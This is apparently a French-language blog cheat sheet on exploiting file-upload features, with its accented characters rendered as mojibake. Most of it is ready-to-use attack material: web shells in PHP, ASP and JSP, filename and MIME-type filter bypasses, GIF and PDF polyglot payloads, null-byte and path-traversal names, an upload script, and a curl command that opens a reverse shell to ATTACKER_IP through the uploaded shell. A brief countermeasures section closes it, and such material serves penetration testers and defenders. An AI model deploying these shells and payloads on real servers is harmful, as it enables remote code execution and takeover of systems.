---
title: Malicious File Upload
date: "2025-07-15"
draft: false
---

# üìÅ Malicious File Upload - Cheat Sheet

## üéØ Vue d'ensemble
Les vuln√©rabilit√©s d'upload de fichiers malveillants permettent d'uploader et d'ex√©cuter du code arbitraire sur un serveur web via des fonctionnalit√©s d'upload non s√©curis√©es.

---

## üîç D√©tection et √ânum√©ration

### Identification des Points d'Upload
```bash
# Recherche de formulaires d'upload
# Pourquoi : Identifier les fonctionnalit√©s d'upload sur le site
grep -r "file.*upload\|upload.*file" /var/www/html/
find /var/www/html/ -name "*.php" -exec grep -l "upload" {} \;

# Analyse des extensions autoris√©es
# Pourquoi : Comprendre les restrictions de fichiers
grep -r "\.jpg\|\.png\|\.gif\|\.pdf" /var/www/html/
```

### Tests de Validation
```bash
# Test des extensions de fichiers
# Pourquoi : V√©rifier si les extensions sont correctement valid√©es
file.jpg.php
file.php.jpg
file.php%00.jpg
file.php;.jpg
```

---

## üõ†Ô∏è Techniques d'Upload

### Bypass d'Extensions
```bash
# Double extension
# Pourquoi : Contourner les filtres qui v√©rifient seulement la fin du nom
shell.php.jpg
shell.php.png
shell.php.gif

# Extension avec point
# Pourquoi : Certains syst√®mes ne g√®rent pas les points multiples
shell.php.
shell.php..

# Extension avec espace
# Pourquoi : Les espaces peuvent √™tre mal g√©r√©s
shell.php 
shell.php%20
```

### Bypass de MIME Type
```bash
# Modification du Content-Type
# Pourquoi : Contourner la validation du type MIME
Content-Type: image/jpeg  # Pour un fichier PHP
Content-Type: application/pdf  # Pour un fichier PHP

# Headers HTTP modifi√©s
# Pourquoi : Masquer le vrai type de fichier
Accept: image/*,application/*
```

### Bypass de Contenu
```php
<?php
// Code PHP masqu√© dans une image
// Pourquoi : Cr√©er un fichier qui ressemble √† une image mais contient du code
GIF89a;
<?php system($_GET['cmd']); ?>
?>
```

---

## üìÅ Types de Fichiers Malveillants

### Web Shells PHP
```php
<?php
// Shell simple
// Pourquoi : Ex√©cuter des commandes syst√®me via le web
system($_GET['cmd']);

// Shell avec interface
// Pourquoi : Interface web pour naviguer et ex√©cuter des commandes
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>

// Shell avec upload
// Pourquoi : Permettre l'upload d'autres fichiers malveillants
<?php
if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
?>
```

### Web Shells ASP/ASPX
```asp
<%
' Shell ASP
' Pourquoi : Ex√©cuter des commandes sur des serveurs Windows
Response.Write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()
%>
```

### Web Shells JSP
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
// Shell JSP
// Pourquoi : Ex√©cuter des commandes sur des serveurs Java
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
```

---

## üîß Outils d'Exploitation

### Burp Suite
```bash
# Intercepter les requ√™tes d'upload
# Pourquoi : Analyser et modifier les requ√™tes d'upload
# 1. Intercepter la requ√™te POST d'upload
# 2. Modifier le nom de fichier et le Content-Type
# 3. Envoyer la requ√™te modifi√©e

# Exemple de modification
# Nom original: image.jpg
# Nom modifi√©: shell.php.jpg
# Content-Type: image/jpeg ‚Üí application/x-php
```

### OWASP ZAP
```bash
# Scanner automatique d'upload
# Pourquoi : D√©tecter automatiquement les vuln√©rabilit√©s d'upload
# 1. Configurer le scanner
# 2. Pointer vers les formulaires d'upload
# 3. Lancer le scan
```

### Custom Scripts
```python
#!/usr/bin/env python3
# Script d'upload automatique
# Pourquoi : Automatiser les tests d'upload

import requests

def upload_file(url, file_path, payload):
    files = {'file': (payload, open(file_path, 'rb'), 'image/jpeg')}
    response = requests.post(url, files=files)
    return response.text
```

---

## üéØ Techniques Avanc√©es

### Polyglot Files
```bash
# Cr√©er un fichier polyglot
# Pourquoi : Cr√©er un fichier valide dans plusieurs formats
# Exemple: GIF + PHP
GIF89a<?php system($_GET['cmd']); ?>

# Exemple: PDF + PHP
%PDF-1.4
<?php system($_GET['cmd']); ?>
```

### Null Byte Injection
```bash
# Injection de null byte
# Pourquoi : Tronquer le nom de fichier apr√®s le null byte
shell.php%00.jpg
shell.php\x00.jpg
```

### Path Traversal
```bash
# Upload avec path traversal
# Pourquoi : Uploader dans des r√©pertoires non autoris√©s
../../../shell.php
..\..\..\shell.php
```

---

## üîç Post-Exploitation

### Localisation du Fichier
```bash
# Recherche du fichier upload√©
# Pourquoi : Trouver o√π le fichier a √©t√© upload√©
find /var/www/html/ -name "*.php" -newer /tmp/reference
find /var/www/html/ -name "*upload*" -type d

# V√©rification des permissions
# Pourquoi : S'assurer que le fichier est ex√©cutable
ls -la /var/www/html/uploads/
chmod +x /var/www/html/uploads/shell.php
```

### Ex√©cution du Shell
```bash
# Acc√®s au shell
# Pourquoi : Obtenir un shell via le fichier upload√©
curl "http://target.com/uploads/shell.php?cmd=whoami"
wget "http://target.com/uploads/shell.php?cmd=id"

# Reverse shell
# Pourquoi : Cr√©er une connexion shell invers√©e
curl "http://target.com/uploads/shell.php?cmd=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

---

## üõ°Ô∏è Contre-Mesures

### Validation des Extensions
```php
<?php
// Validation stricte des extensions
// Pourquoi : Emp√™cher l'upload de fichiers dangereux
$allowed = array('jpg', 'jpeg', 'png', 'gif');
$filename = $_FILES['file']['name'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

if (!in_array($ext, $allowed)) {
    die('Extension non autoris√©e');
}
?>
```

### Validation du Contenu
```php
<?php
// V√©rification du contenu du fichier
// Pourquoi : D√©tecter les fichiers malveillants m√™me avec une extension valide
$content = file_get_contents($_FILES['file']['tmp_name']);
if (strpos($content, '<?php') !== false) {
    die('Contenu PHP d√©tect√©');
}
?>
```

### Configuration Serveur
```apache
# .htaccess pour bloquer l'ex√©cution
# Pourquoi : Emp√™cher l'ex√©cution de PHP dans les dossiers d'upload
<Directory "/var/www/html/uploads">
    php_flag engine off
    AddType text/plain .php .php3 .php4 .php5
</Directory>
```

---

## üìö Ressources

- **OWASP File Upload** : https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- **HackTricks File Upload** : https://book.hacktricks.xyz/pentesting-web/file-upload
- **PayloadsAllTheThings File Upload** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- **File Upload Cheat Sheet** : https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

---

_Derni√®re mise √† jour : 15 juillet 2025_ 